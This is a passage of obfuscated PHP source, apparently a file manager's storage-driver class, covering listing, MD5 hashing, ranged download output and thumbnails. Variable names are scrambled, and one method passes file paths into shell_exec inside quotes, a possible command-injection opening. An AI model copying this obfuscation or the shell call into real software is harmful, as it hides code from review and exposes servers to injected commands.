$º£óØÈ; @touch($ì‚‘¶ò); if ($‰İåìì¦) { file_put_contents($ì‚‘¶ò, $‰İåìì¦); } return $ì‚‘¶ò; } public function tempFileRemve($ÉñŒ¯ùï) { @unlink($ÉñŒ¯ùï); @rmdir($this->pathFather($ÉñŒ¯ùï)); } public function mkfile($«¡‘ŞÁ¼, $¬ºÑ¿¢é = '', $Ÿş»Òšä = REPEAT_RENAME) { } public function mkdir($Ñ´ö‹ˆ’, $òÃñŸ¶À = REPEAT_SKIP) { } public function delFile($Ï…Àı) { } public function delFolder($àà«ùƒ) { } public function copyFile($™èÜä, $â‡Üšñù) { } public function moveFile($ğ¬¾³Òã, $–´Î–÷û) { } public function remove($ÎÛˆÔ¸™) { if ($this->isFile($ÎÛˆÔ¸™)) { return $this->delFile($ÎÛˆÔ¸™); } return $this->delFolder($ÎÛˆÔ¸™); } public function rename($—‚–¨®, $ªöüˆ§) { } public function exist($ÌÔ‡óİ¦) { } public function findByHash($ˆã­±» = '', $‚”¿Ö³ = '') { return !1; } public function isFile($¤ß¢Ö¸«) { } public function isFolder($ğÈ¾³ÒÈ) { } public function size($ö¼¥©ü§) { } public function info($£…®š²Ö) { } public function infoSimple($†Ğ·½Åœ) { return $this->info($†Ğ·½Åœ); } public function infoAuth($ÆÌôùğ«) { return $this->info($ÆÌôùğ«); } public function infoFull($ÏşÑ§¥) { return $this->info($ÏşÑ§¥); } public function infoWithChildren($èÊËÁÒÃ) { $Ôåïğ¯Ê =& $_SERVER[Ü©»’·]; static $ŒåéŒ¨¦ = array(); if (isset($ŒåéŒ¨¦[$èÊËÁÒÃ])) { return $ŒåéŒ¨¦[$èÊËÁÒÃ]; } $ÂšÅ±í  = $this->info($èÊËÁÒÃ); if ($ÂšÅ±í  && $ÂšÅ±í [$Ôåïğ¯Ê[33]] == $Ôåïğ¯Ê[75]) { $‡‡ç¯šé = array($Ôåïğ¯Ê[76] => 0, $Ôåïğ¯Ê[77] => 0, $Ôåïğ¯Ê[78] => 0); $this->infoChildren($èÊËÁÒÃ, $‡‡ç¯šé); $ÂšÅ±í [$Ôåïğ¯Ê[76]] = $‡‡ç¯šé[$Ôåïğ¯Ê[76]]; $ÂšÅ±í [$Ôåïğ¯Ê[79]] = array($Ôåïğ¯Ê[80] => $‡‡ç¯šé[$Ôåïğ¯Ê[77]], $Ôåïğ¯Ê[81] => $‡‡ç¯šé[$Ôåïğ¯Ê[78]]); $ŒåéŒ¨¦[$èÊËÁÒÃ] = $ÂšÅ±í ; } return $ÂšÅ±í ; } public function listPath($®º‡‘ææ, $ËØ’ªÊŞ = false) { } public function has($¼¦ Õ€Â, $•Ã¡Û® = false, $Ù‚½øÏÑ = false) { } public function canRead($ì¢ªÌ†’) { } public function canWrite($ÀÁ­í”œ) { } public function getContent($óôåâ€¨) { } public function setContent($‹·‚Õ÷, $çİİ›«» = '') { } protected function infoChildren($¡Á©ªÒ, &$Ş¬É«û£) { $½¿ğ‰†š =& $_SERVER[Ü©»’·]; check_abort_echo(); $‘‡óü°Õ = $this->listPath($¡Á©ªÒ, !0); $‘‡óü°Õ = array_merge($‘‡óü°Õ[$½¿ğ‰†š[82]], $‘‡óü°Õ[$½¿ğ‰†š[83]]); foreach ($‘‡óü°Õ as $´á¸‡º¼) { if ($´á¸‡º¼[$½¿ğ‰†š[33]] == $½¿ğ‰†š[75]) { $Ş¬É«û£[$½¿ğ‰†š[78]]++; $ã‚‰¢ = $this->getPathInner($´á¸‡º¼[$½¿ğ‰†š[84]]); $this->infoChildren($ã‚‰¢, $Ş¬É«û£); } else { $Ş¬É«û£[$½¿ğ‰†š[77]]++; $Ş¬É«û£[$½¿ğ‰†š[76]] += $´á¸‡º¼[$½¿ğ‰†š[76]]; } } } public function fileSubstr($Ó‘Ã…©½, $¯ÆÕé¤®, $ÁÌÆªöÙ) { } public function listAll($°ŸòÊÄğ) { } public function listAllMake($ÙõĞŞ±Í, &$®½¨š…«) { $şÍÓĞ¯ı =& $_SERVER[Ü©»’·]; check_abort_echo(); $÷¼Ÿ­Ì = $this->listPath($ÙõĞŞ±Í, !0); if (!$÷¼Ÿ­Ì) { return; } $¬è‰Èç– = array_merge($÷¼Ÿ­Ì[$şÍÓĞ¯ı[82]], $÷¼Ÿ­Ì[$şÍÓĞ¯ı[83]]); foreach ($¬è‰Èç– as $âÙ†¥Á‹) { $¤¯¨ô¢ = $âÙ†¥Á‹[$şÍÓĞ¯ı[33]] == $şÍÓĞ¯ı[75]; $ƒñ…àª = array($şÍÓĞ¯ı[84] => $âÙ†¥Á‹[$şÍÓĞ¯ı[84]], $şÍÓĞ¯ı[75] => $¤¯¨ô¢); if (isset($âÙ†¥Á‹[$şÍÓĞ¯ı[76]])) { $ƒñ…àª[$şÍÓĞ¯ı[76]] = $âÙ†¥Á‹[$şÍÓĞ¯ı[76]]; } if (isset($âÙ†¥Á‹[$şÍÓĞ¯ı[85]])) { $ƒñ…àª[$şÍÓĞ¯ı[85]] = $âÙ†¥Á‹[$şÍÓĞ¯ı[85]]; } if (!$¤¯¨ô¢) { $®½¨š…«[] = $ƒñ…àª; continue; } $®½¨š…«[] = $ƒñ…àª; $ŒëÄ˜¯ã = $âÙ†¥Á‹[$şÍÓĞ¯ı[84]]; $ØºßÌæ = $this->pathDriver; if (substr($âÙ†¥Á‹[$şÍÓĞ¯ı[84]], 0, strlen($ØºßÌæ)) == $ØºßÌæ) { $ŒëÄ˜¯ã = substr($ŒëÄ˜¯ã, strlen($ØºßÌæ)); } $this->listAllMake($ŒëÄ˜¯ã, $®½¨š…«); } } public function listAllSimple($¹³¦ÄÓÊ) { $Â¹òùÖ =& $_SERVER[Ü©»’·]; $³©«ğ¾Å = array(); $ØĞ÷‘›õ = $this->listAll($¹³¦ÄÓÊ); $Ùìã´ªå = $this->getPathOuter($¹³¦ÄÓÊ); foreach ($ØĞ÷‘›õ as $öÃ¦­°Ç) { $È´œƒŞë = $öÃ¦­°Ç[$Â¹òùÖ[84]]; $»şĞÌì¡ = $öÃ¦­°Ç[$Â¹òùÖ[84]]; if (isset($öÃ¦­°Ç[$Â¹òùÖ[86]])) { $È´œƒŞë = $öÃ¦­°Ç[$Â¹òùÖ[86]][$Â¹òùÖ[84]]; $öÃ¦­°Ç[$Â¹òùÖ[76]] = $öÃ¦­°Ç[$Â¹òùÖ[86]][$Â¹òùÖ[76]]; $öÃ¦­°Ç[$Â¹òùÖ[85]] = $öÃ¦­°Ç[$Â¹òùÖ[86]][$Â¹òùÖ[85]]; } else { $»şĞÌì¡ = substr($öÃ¦­°Ç[$Â¹òùÖ[84]], strlen(get_path_father($Ùìã´ªå))); $»şĞÌì¡ = $Â¹òùÖ[8] . ltrim($»şĞÌì¡, $Â¹òùÖ[8]); } $©ñ¬ÓŸ¤ = array($Â¹òùÖ[84] => $»şĞÌì¡, $Â¹òùÖ[75] => $öÃ¦­°Ç[$Â¹òùÖ[75]]); if (isset($öÃ¦­°Ç[$Â¹òùÖ[76]]) && !$öÃ¦­°Ç[$Â¹òùÖ[75]]) { $©ñ¬ÓŸ¤[$Â¹òùÖ[76]] = $öÃ¦­°Ç[$Â¹òùÖ[76]]; } if (isset($öÃ¦­°Ç[$Â¹òùÖ[85]])) { $©ñ¬ÓŸ¤[$Â¹òùÖ[85]] = $öÃ¦­°Ç[$Â¹òùÖ[85]]; } if (!$öÃ¦­°Ç[$Â¹òùÖ[75]]) { $©ñ¬ÓŸ¤[$Â¹òùÖ[87]] = $È´œƒŞë; } $³©«ğ¾Å[] = $©ñ¬ÓŸ¤; } return $³©«ğ¾Å; } public function upload($ÏúÀ¼Ñ‘, $×î˜ÒÓÂ, $¨Ğšê€î = false, $±³Ç«‹ = REPEAT_REPLACE) { } public function uploadFileByID($ô’¡ËÅ·, $¼¿Å²úÂ, $ª±Í›®Õ) { } public function uploadFileByPath($­ş¨·², $ñÁøœ”Ë, $¥­—¼º = array()) { } public function isUploadServer() { $æÃ¯°º¥ =& $_SERVER[Ü©»’·]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $æÃ¯°º¥[88]) { return !0; } return $GLOBALS[$æÃ¯°º¥[6]][$æÃ¯°º¥[89]][$æÃ¯°º¥[90]]; } public function isFileOutServer() { $ß’ä«Ãß =& $_SERVER[Ü©»’·]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ß’ä«Ãß[88]) { return !0; } return $GLOBALS[$ß’ä«Ãß[6]][$ß’ä«Ãß[89]][$ß’ä«Ãß[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($‚Š—³ô) { $ÙŸÊ¯Œ =& $_SERVER[Ü©»’·]; if (!$this->isCdnHost()) { return $‚Š—³ô; } return str_replace(trim(get_url_root($‚Š—³ô), $ÙŸÊ¯Œ[8]), trim($this->cdnHost, $ÙŸÊ¯Œ[8]), $‚Š—³ô); } public function uploadLink($½ı‹®ä¡, $İšçÔœ¨ = 0) { $ãè²û¸í =& $_SERVER[Ü©»’·]; if ($this->isUploadServer()) { return; } $®™ú³è = $this->getType(); if (!in_array($®™ú³è, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ìùÙÌ¾× = 1024 * 1024 * 10; $Å•µëŸÚ = $İšçÔœ¨ <= $ìùÙÌ¾× ? $ãè²û¸í[92] : $ãè²û¸í[93]; $áŠê’Ğ¸ = (!$İšçÔœ¨ ? 1 : ceil($İšçÔœ¨ / pow(1024, 3))) * 3600 * 4; $§ªñ¬Ñˆ = $this->{$Å•µëŸÚ}($½ı‹®ä¡, $áŠê’Ğ¸); if ($§ªñ¬Ñˆ) { $§ªñ¬Ñˆ[$ãè²û¸í[94]] = $½ı‹®ä¡; $§ªñ¬Ñˆ[$ãè²û¸í[95]] = $®™ú³è; } return $§ªñ¬Ñˆ; } public function uploadFormData($³»™Èİ×, $Øµ©¨™ = 3600) { } public function multiUploadFormData($âÓ“¥¬¢, $½úËšöõ = 3600) { } public function download($æò‡ß, $õ®™æ€à) { } public function ext($»¥©§æ) { $Çê„Ïì =& $_SERVER[Ü©»’·]; if (strpos($»¥©§æ, $Çê„Ïì[8]) === -1) { $»¶àšåå = $»¥©§æ; } else { $»¶àšåå = $this->pathThis($»¥©§æ); } $öµĞÉİµ = $Çê„Ïì[12]; if (strstr($»¶àšåå, $Çê„Ïì[10])) { $öµĞÉİµ = substr($»¶àšåå, strrpos($»¶àšåå, $Çê„Ïì[10]) + 1); $öµĞÉİµ = strtolower($öµĞÉİµ); } if (strlen($öµĞÉİµ) > 3 && preg_match($Çê„Ïì[96], $öµĞÉİµ, $öéä¨ŸÉ)) { $öµĞÉİµ = $Çê„Ïì[12]; } return $öµĞÉİµ; } public function pathThis($¡ÇÄòĞ·) { $–èÙòò¿ =& $_SERVER[Ü©»’·]; $¡ÇÄòĞ· = str_replace($–èÙòò¿[97], $–èÙòò¿[8], rtrim($¡ÇÄòĞ·, $–èÙòò¿[8])); $è²ˆÏÒ± = strrpos($¡ÇÄòĞ·, $–èÙòò¿[8]); if ($è²ˆÏÒ± === !1) { return $¡ÇÄòĞ·; } return substr($¡ÇÄòĞ·, $è²ˆÏÒ± + 1); } public function pathFather($ÉÆ­Ôü) { $€ã¤Ä„Ú =& $_SERVER[Ü©»’·]; $ÉÆ­Ôü = str_replace($€ã¤Ä„Ú[97], $€ã¤Ä„Ú[8], rtrim($ÉÆ­Ôü, $€ã¤Ä„Ú[8])); $ıœ¤Œ´û = strrpos($ÉÆ­Ôü, $€ã¤Ä„Ú[8]); if ($ıœ¤Œ´û === !1) { return $€ã¤Ä„Ú[12]; } return substr($ÉÆ­Ôü, 0, $ıœ¤Œ´û + 1); } public function hashSimple($ÌäœÜ¾Ò) { $ÒŠÎä˜ =& $_SERVER[Ü©»’·]; if (!$ÌäœÜ¾Ò) { return md5($ÒŠÎä˜[12]); } $ÌÁ¶µİµ = $this->size($ÌäœÜ¾Ò); $÷’¡¿•§ = 200; $«ƒÁó¿ = 50; if ($ÌÁ¶µİµ <= $÷’¡¿•§ * $«ƒÁó¿) { return $this->hashMd5($ÌäœÜ¾Ò) . $ÌÁ¶µİµ; } $¶•ØÆ³š = intval($ÌÁ¶µİµ / $«ƒÁó¿); $ “ê¤‚ = $ÒŠÎä˜[12]; for ($Ó´º¶Ìö = 0; $Ó´º¶Ìö < $«ƒÁó¿; $Ó´º¶Ìö++) { $ “ê¤‚ .= $this->fileSubstr($ÌäœÜ¾Ò, $¶•ØÆ³š * $Ó´º¶Ìö, $÷’¡¿•§); } $ “ê¤‚ .= $this->fileSubstr($ÌäœÜ¾Ò, $ÌÁ¶µİµ - $÷’¡¿•§, $÷’¡¿•§); return md5($ “ê¤‚) . $ÌÁ¶µİµ; } public static $md5Cache = array(); public function hashMd5($ñ¸ÎÇ«…) { if (!$ñ¸ÎÇ«…) { return md5($_SERVER[Ü©»’·][12]); } $ñ¸ÎÇ«… = $this->iconvSystem($ñ¸ÎÇ«…); if (isset(self::$md5Cache[$ñ¸ÎÇ«…])) { return self::$md5Cache[$ñ¸ÎÇ«…]; } self::$md5Cache[$ñ¸ÎÇ«…] = $this->hashMd5Shell($ñ¸ÎÇ«…); if (!self::$md5Cache[$ñ¸ÎÇ«…]) { self::$md5Cache[$ñ¸ÎÇ«…] = @md5_file($ñ¸ÎÇ«…); } return self::$md5Cache[$ñ¸ÎÇ«…]; } private function hashMd5Shell($İÊé¤Á) { $ÃöÁÁ­ =& $_SERVER[Ü©»’·]; if (!$İÊé¤Á) { return md5($ÃöÁÁ­[12]); } if (!function_exists($ÃöÁÁ­[98])) { return !1; } $˜áñ½ö = array($ÃöÁÁ­[99], $ÃöÁÁ­[100]); $İÊ‰¨Öƒ = Cache::get($ÃöÁÁ­[101]); if (!$İÊ‰¨Öƒ) { $ƒ™ï«à = BASIC_PATH . $ÃöÁÁ­[102]; $ºØšãİÉ = md5_file($ƒ™ï«à); $İÊ‰¨Öƒ = $ÃöÁÁ­[103]; foreach ($˜áñ½ö as $²‚ÍÈ¯·) { $åŠ”¿Ò« = shell_exec($²‚ÍÈ¯· . "\40\x22{$ƒ™ï«à}\x22"); if ($åŠ”¿Ò« && substr(trim($åŠ”¿Ò«), 0, 32) == $ºØšãİÉ) { $İÊ‰¨Öƒ = $²‚ÍÈ¯·; break; } } Cache::set($ÃöÁÁ­[101], $İÊ‰¨Öƒ, 3600); } if ($İÊ‰¨Öƒ == $ÃöÁÁ­[103]) { return !1; } $åŠ”¿Ò« = shell_exec($İÊ‰¨Öƒ . "\40\42{$İÊé¤Á}\42"); $åŠ”¿Ò« = str_replace($ÃöÁÁ­[104], $ÃöÁÁ­[12], $åŠ”¿Ò«); return substr($åŠ”¿Ò«, 0, 32); } public function link($ÄŸ¶şğÆ) { return $ÄŸ¶şğÆ; } public function fileOut($‹î‰Ò, $§â–‘Ú£ = false, $ª°øÛºß = false, $ÃÍ£òƒ¶ = '') { $ŞÂÙ€é¦ =& $_SERVER[Ü©»’·]; $this->cacheMethod(null, null); if (!$‹î‰Ò || !$this->exist($‹î‰Ò)) { show_json(LNG($ŞÂÙ€é¦[105]), !1, $ª°øÛºß); } $Ş•¯…½é = $this->getType() == $ŞÂÙ€é¦[106]; $ìÖËÆ®Î = $GLOBALS[$ŞÂÙ€é¦[6]][$ŞÂÙ€é¦[89]][$ŞÂÙ€é¦[107]][$ŞÂÙ€é¦[108]]; $Û¿İˆı® = (double) $GLOBALS[$ŞÂÙ€é¦[6]][$ŞÂÙ€é¦[89]][$ŞÂÙ€é¦[107]][$ŞÂÙ€é¦[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $³Ûäƒ…… = $this->infoFull($‹î‰Ò); $ĞâÛ»ôø = $³Ûäƒ……[$ŞÂÙ€é¦[76]]; $¶Ç©šÓš = gmdate($ŞÂÙ€é¦[110], $³Ûäƒ……[$ŞÂÙ€é¦[85]]); $ˆŒï¿°€ = $ª°øÛºß ? $ª°øÛºß : $this->iconvApp($³Ûäƒ……[$ŞÂÙ€é¦[32]]); $æÀ‘ÌÕ¬ = 0; $œİ¿£Š˜ = $ĞâÛ»ôø - 1; $‰ãŠñ€ = $this->ext($ˆŒï¿°€); if (in_array($‰ãŠñ€, array($ŞÂÙ€é¦[111], $ŞÂÙ€é¦[112], $ŞÂÙ€é¦[113], $ŞÂÙ€é¦[114]))) { $‰ãŠñ€ = $ŞÂÙ€é¦[115]; } if (in_array($‰ãŠñ€, array($ŞÂÙ€é¦[116]))) { $‰ãŠñ€ = $ŞÂÙ€é¦[117]; } if (!$ÃÍ£òƒ¶) { $ÃÍ£òƒ¶ = md5($¶Ç©šÓš . $this->hashSimple($‹î‰Ò)); } $ÃÍ£òƒ¶ = $ŞÂÙ€é¦[118] . $ÃÍ£òƒ¶ . $ŞÂÙ€é¦[118]; $Ô™şŞ°Ä = get_file_mime($‰ãŠñ€); $‚ç·ãÛ = !0; $‚ç·ãÛ = isset($_GET[$ŞÂÙ€é¦[119]]) ? !1 : !0; if ($§â–‘Ú£ === !1 && !mime_support($Ô™şŞ°Ä)) { $Ô™şŞ°Ä = $ŞÂÙ€é¦[120]; } header($ŞÂÙ€é¦[121]); header($ŞÂÙ€é¦[122] . $Ô™şŞ°Ä); $Ğ×ıà¾ë = rawurlencode($ˆŒï¿°€); $Ğ×ıà¾ë = $ŞÂÙ€é¦[118] . $Ğ×ıà¾ë . $ŞÂÙ€é¦[123] . $Ğ×ıà¾ë; if ($§â–‘Ú£) { header($ŞÂÙ€é¦[124]); header($ŞÂÙ€é¦[125] . $Ğ×ıà¾ë); } else { if ($‚ç·ãÛ) { header($ŞÂÙ€é¦[126] . $Ğ×ıà¾ë); } } header($ŞÂÙ€é¦[127] . gmdate($ŞÂÙ€é¦[110], time() + 3600 * 24 * 30) . $ŞÂÙ€é¦[128]); header($ŞÂÙ€é¦[129]); header($ŞÂÙ€é¦[130]); header($ŞÂÙ€é¦[131]); if (isset($_SERVER[$ŞÂÙ€é¦[132]]) && strtotime($_SERVER[$ŞÂÙ€é¦[132]]) == $³Ûäƒ……[$ŞÂÙ€é¦[85]]) { header($ŞÂÙ€é¦[133], !0, 304); die; } if (isset($_SERVER[$ŞÂÙ€é¦[134]]) && $_SERVER[$ŞÂÙ€é¦[134]] == $ÃÍ£òƒ¶) { header($ŞÂÙ€é¦[135] . $ÃÍ£òƒ¶, !0, 304); die; } header($ŞÂÙ€é¦[135] . $ÃÍ£òƒ¶); header($ŞÂÙ€é¦[136] . $¶Ç©šÓš . $ŞÂÙ€é¦[128]); header($ŞÂÙ€é¦[137] . $ˆŒï¿°€); header($ŞÂÙ€é¦[138]); header($ŞÂÙ€é¦[139] . $ĞâÛ»ôø); header($ŞÂÙ€é¦[140]); if (!$§â–‘Ú£ && $‰ãŠñ€ == $ŞÂÙ€é¦[141]) { if ($ĞâÛ»ôø > 1024 * 1024 * 5) { die; } $îÚëÏÄ = $this->getContent($‹î‰Ò); $îÚëÏÄ = Html::clearSVG($îÚëÏÄ); header($ŞÂÙ€é¦[142] . strlen($îÚëÏÄ)); echo $îÚëÏÄ; die; } $÷Çüº‚© = strtolower($_SERVER[$ŞÂÙ€é¦[143]]); if ($Ş•¯…½é && $÷Çüº‚© && $ìÖËÆ®Î) { if (strstr($÷Çüº‚©, $ŞÂÙ€é¦[144])) { header($ŞÂÙ€é¦[145] . $‹î‰Ò); } else { if (strstr($÷Çüº‚©, $ŞÂÙ€é¦[146])) { header($ŞÂÙ€é¦[147] . $‹î‰Ò); } else { if (strstr($÷Çüº‚©, $ŞÂÙ€é¦[148])) { header($ŞÂÙ€é¦[149] . $‹î‰Ò); } } } if ($Û¿İˆı®) { header($ŞÂÙ€é¦[150] . $Û¿İˆı®); } return; } if (isset($_SERVER[$ŞÂÙ€é¦[151]])) { if (preg_match($ŞÂÙ€é¦[152], $_SERVER[$ŞÂÙ€é¦[151]], $°Á¼îˆ)) { $æÀ‘ÌÕ¬ = intval($°Á¼îˆ[1]); $æÀ‘ÌÕ¬ = $æÀ‘ÌÕ¬ <= 0 ? 0 : ($æÀ‘ÌÕ¬ >= $œİ¿£Š˜ ? $œİ¿£Š˜ : $æÀ‘ÌÕ¬); if (!empty($°Á¼îˆ[2])) { $¶¥âéÙ“ = intval($°Á¼îˆ[2]); $œİ¿£Š˜ = $¶¥âéÙ“ < $æÀ‘ÌÕ¬ ? $æÀ‘ÌÕ¬ : ($¶¥âéÙ“ >= $œİ¿£Š˜ ? $œİ¿£Š˜ : $¶¥âéÙ“); } } header($ŞÂÙ€é¦[153]); header("\103\x6f\156\164\x65\156\164\55\x52\x61\156\147\x65\x3a\x20\x62\x79\164\145\163\40{$æÀ‘ÌÕ¬}\55{$œİ¿£Š˜}\57" . $ĞâÛ»ôø); } else { header($ŞÂÙ€é¦[154]); } header($ŞÂÙ€é¦[155]); $œõíüü“ = !0; if ($_SERVER[$ŞÂÙ€é¦[156]] == $ŞÂÙ€é¦[157] && $ĞâÛ»ôø > 1204 * 1024 * 1024 * 2) { $œõíüü“ = !1; } if ($œõíüü“) { header($ŞÂÙ€é¦[158] . ($œİ¿£Š˜ - $æÀ‘ÌÕ¬ + 1)); } if ($_SERVER[$ŞÂÙ€é¦[159]] == $ŞÂÙ€é¦[160]) { return; } $ñö£‰»¦ = 1024 * 100; $Ø³¥úäâ = 0; if ($Û¿İˆı®) { $Ø³¥úäâ = intval(1000 * 1000 * ($ñö£‰»¦ / $Û¿İˆı®)); } while ($æÀ‘ÌÕ¬ <= $œİ¿£Š˜) { $÷ö‚ÒÔÕ = timeFloat(); check_abort(); $ú¡¿Œª° = $œİ¿£Š˜ - $æÀ‘ÌÕ¬ + 1; if ($ú¡¿Œª° <= $ñö£‰»¦) { $ñö£‰»¦ = $ú¡¿Œª°; } echo $this->fileSubstr($‹î‰Ò, $æÀ‘ÌÕ¬, $ñö£‰»¦); $æÀ‘ÌÕ¬ += $ñö£‰»¦; if ($ñö£‰»¦ == $ú¡¿Œª°) { $æÀ‘ÌÕ¬ = $œİ¿£Š˜ + 1; } if ($Ø³¥úäâ) { $Ç…¼äºá = intval(1000 * 1000 * (timeFloat() - $÷ö‚ÒÔÕ)); $»áóé = $Ø³¥úäâ - $Ç…¼äºá; if ($»áóé > 5) { usleep($»áóé); } } } } public function fileOutServer($ÊÂÈ ï», $–Îé›ß² = false, $éŠâüôË = false, $úŞé©€¦ = '') { $this->fileOut($ÊÂÈ ï», $–Îé›ß², $éŠâüôË, $úŞé©€¦); } public function fileOutLink($ëôÏ–·) { header($_SERVER[Ü©»’·][161] . $ëôÏ–·); die; } public function cacheMethod($‹ÌÒ¨ú, $‡‘ığŸŠ, $ÀíÕ—† = null) { $í³ï¢åƒ =& $_SERVER[Ü©»’·]; static $õ¦ÌÒ‡ = array(); $‹àÓÙŠâ = $‡‘ığŸŠ ? ltrim($this->getPathOuter($‡‘ığŸŠ), $í³ï¢åƒ[8]) : $í³ï¢åƒ[12]; $Úüò÷Â´ = $í³ï¢åƒ[162] . $‹ÌÒ¨ú . $í³ï¢åƒ[163] . rtrim($‹àÓÙŠâ, $í³ï¢åƒ[8]); if (is_null($‹ÌÒ¨ú)) { $õ¦ÌÒ‡ = array(); return; } if (is_null($‡‘ığŸŠ)) { foreach ($õ¦ÌÒ‡ as $Úüò÷Â´ => $«¡ñ“®) { if (!strstr($Úüò÷Â´, $í³ï¢åƒ[162] . $‹ÌÒ¨ú . $í³ï¢åƒ[164])) { continue; } unset($õ¦ÌÒ‡[$Úüò÷Â´]); } return; } if (!is_null($ÀíÕ—†)) { $õ¦ÌÒ‡[$Úüò÷Â´] = $ÀíÕ—†; return; } $Ç–©„æ = isset($õ¦ÌÒ‡[$Úüò÷Â´]) ? $õ¦ÌÒ‡[$Úüò÷Â´] : null; if (!is_null($Ç–©„æ)) { return $Ç–©„æ; } $Ç–©„æ = $this->{$‹ÌÒ¨ú}($‡‘ığŸŠ); $õ¦ÌÒ‡[$Úüò÷Â´] = $Ç–©„æ; return $Ç–©„æ; } public function cacheMethodInfoSet($Í®äéôî, $Ú€š“é , $ÔÃ‘Ğó = false) { $á¿ü†” =& $_SERVER[Ü©»’·]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($á¿ü†”[165], $Í®äéôî, $Ú€š“é ); $this->cacheMethod($á¿ü†”[166], $Í®äéôî, $Ú€š“é  ? !1 : !0); if (is_array($ÔÃ‘Ğó)) { $this->cacheMethod($á¿ü†”[167], $Í®äéôî, $ÔÃ‘Ğó); } } public function fileOutImage($°¬Ëã¡¨, $Á—«šÉØ = 250) { $Ùâ³çÉ¨ =& $_SERVER[Ü©»’·]; set_timeout(); if (substr($°¬Ëã¡¨, 0, 4) == $Ùâ³çÉ¨[148]) { $this->fileOutLink($°¬Ëã¡¨); } $‡”è˜Õó = $this->info($°¬Ëã¡¨); $¥¢ïÃ¨ã = $‡”è˜Õó[$Ùâ³çÉ¨[32]]; $Á½‰§œÜ = !1; if (isset($GLOBALS[$Ùâ³çÉ¨[168]]) && $GLOBALS[$Ùâ³çÉ¨[168]][$Ùâ³çÉ¨[84]] == $‡”è˜Õó[$Ùâ³çÉ¨[84]]) { $Ç³¶ÄÆğ = $GLOBALS[$Ùâ³çÉ¨[168]][$Ùâ³çÉ¨[169]]; if (!$‡”è˜Õó[$Ùâ³çÉ¨[170]]) { $‡”è˜Õó[$Ùâ³çÉ¨[170]] = $GLOBALS[$Ùâ³çÉ¨[168]]; } if (isset($Ç³¶ÄÆğ[$Ùâ³çÉ¨[171]])) { if ($Ç³¶ÄÆğ[$Ùâ³çÉ¨[171]] <= $Á—«šÉØ && $Ç³¶ÄÆğ[$Ùâ³çÉ¨[172]] <= $Á—«šÉØ) { $Á½‰§œÜ = !0; } } $¥¢ïÃ¨ã = $‡”è˜Õó[$Ùâ³çÉ¨[170]][$Ùâ³çÉ¨[32]]; } if ($‡”è˜Õó[$Ùâ³çÉ¨[76]] <= 1024 * 50 || $Á½‰§œÜ || !function_exists($Ùâ³çÉ¨[173]) || $‡”è˜Õó[$Ùâ³çÉ¨[174]] == $Ùâ³çÉ¨[175]) { return $this->fileOut($°¬Ëã¡¨, !1, $¥¢ïÃ¨ã); } if (isset($‡”è˜Õó[$Ùâ³çÉ¨[170]][$Ùâ³çÉ¨[176]])) { $‰á‰şµ† = $‡”è˜Õó[$Ùâ³çÉ¨[170]][$Ùâ³çÉ¨[176]]; } else { if (isset($‡”è˜Õó[$Ùâ³çÉ¨[170]][$Ùâ³çÉ¨[177]])) { $‰á‰şµ† = $‡”è˜Õó[$Ùâ³çÉ¨[170]][$Ùâ³çÉ¨[177]]; } } if (!$‰á‰şµ†) { $‰á‰şµ† = md5("{$‡”è˜Õó[$Ùâ³çÉ¨[32]]}\x5f{$‡”è˜Õó[$Ùâ³çÉ¨[84]]}\137{$‡”è˜Õó[$Ùâ³çÉ¨[76]]}\137{$Á—«šÉØ}"); } $±ÌùæóË = "{$‰á‰şµ†}\x5f{$Á—«šÉØ}\56\x70\x6e\147"; if (!($Í»¥à³ã = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Ùâ³çÉ¨[178]))) { $Ü¹ŠëØ‹ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Ùâ³çÉ¨[179]); } else { $Ü¹ŠëØ‹ = KodIO::make($Í»¥à³ã); } if ($Í»¥à³ã = IO::fileNameExist($Ü¹ŠëØ‹, $±ÌùæóË)) { $É‹®Îıå = KodIO::make($Í»¥à³ã); return IO::fileOut($É‹®Îıå, !1, $¥¢ïÃ¨ã); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $É‹®Îıå = DATA_THUMB . $±ÌùæóË; del_file($É‹®Îıå); if (!@file_exists($É‹®Îıå)) { $Æå…Èøã = TEMP_FILES; if (!is_dir($Æå…Èøã)) { mk_dir($Æå…Èøã); } $Ä†ó™½ = $Æå…Èøã . $‰á‰şµ† . $Ùâ³çÉ¨[10] . $‡”è˜Õó[$Ùâ³çÉ¨[174]]; if (!@file_exists($Ä†ó™½)) { $Ä†ó™½ = $this->download($°¬Ëã¡¨, $Ä†ó™½); } ImageThumb::createThumb($Ä†ó™½, $É‹®Îıå, $Á—«šÉØ, $Á—«šÉØ * 10); } if (!file_exists($É‹®Îıå) || filesize($É‹®Îıå) < 100) { return @file_exists($Ä†ó™½) ? IO::fileOut($Ä†ó™½) : $this->fileOut($°¬Ëã¡¨); } if (!($Å…Œ²”å = IO::move($É‹®Îıå, $Ü¹ŠëØ‹))) { return IO::fileOut($É‹®Îıå); } del_file($É‹®Îıå); IO::fileOut($Å…Œ²”å); } public function fileOutImageServer($·¥¯Ûôœ, $ˆØ¦‹†Â = 250) { $this->fileOutImage($·¥¯Ûôœ, $ˆØ¦‹†Â); } public function fileNameAuto($³¢¡’Ë­, $ãœõêŒœ, $ß‘šş™Æ = REPEAT_RENAME, $‚ÇƒŞ©á = false) { $·œ£ƒõš =& $_SERVER[Ü©»’·]; $’”ËØ–Ò = $³¢¡’Ë­ === $·œ£ƒõš[12] ? $ãœõêŒœ : rtrim($³¢¡’Ë­, $·œ£ƒõš[8]) . $·œ£ƒõš[8] . $ãœõêŒœ; if ($ß‘šş™Æ == REPEAT_REPLACE || !$this->exist($’”ËØ–Ò) || $‚ÇƒŞ©á && $ß‘šş™Æ != REPEAT_RENAME_FOLDER) { return $ãœõêŒœ; } if ($ß‘šş™Æ == REPEAT_SKIP) { return !1; } $ëÙ ¶›¦ = $·œ£ƒõš[10] . get_path_ext($ãœõêŒœ); $ëÙ ¶›¦ = $ëÙ ¶›¦ == $·œ£ƒõš[10] || $‚ÇƒŞ©á ? $·œ£ƒõš[12] : $ëÙ ¶›¦; $ã‡ÎØ‡¯ = 1; $ã¹›Í”Ô 